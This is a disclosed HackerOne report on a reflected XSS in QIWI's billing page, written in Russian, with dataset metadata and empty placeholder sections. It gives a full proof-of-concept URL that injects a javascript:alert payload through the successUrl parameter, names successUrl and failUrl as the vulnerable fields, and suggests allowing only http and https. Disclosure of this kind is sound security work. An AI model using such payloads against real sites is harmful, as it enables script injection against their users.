---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '151034'
original_report_id: '151034'
title: Xss on billing
weakness: Cross-site Scripting (XSS) - Generic
team_handle: qiwi
created_at: '2016-07-13T01:58:47.306Z'
disclosed_at: '2017-06-13T08:22:50.728Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 8
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Xss on billing

## Metadata

- HackerOne Report ID: 151034
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: qiwi
- Disclosed At: 2017-06-13T08:22:50.728Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

При нажатии "Вернуться на сайт" вызывается javascript:alert (F104691 - href vulnerable)
https://bill.qiwi.com/order/external/success.action?comm=test&from=6045&to=&successUrl=javascript%3Aalert(1)//&order=747156761&phone=79051564213

Уязвимое поля: successUrl, failUrl

Как пофиксить: 
Сделать фильтр и разрешать http и https...

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
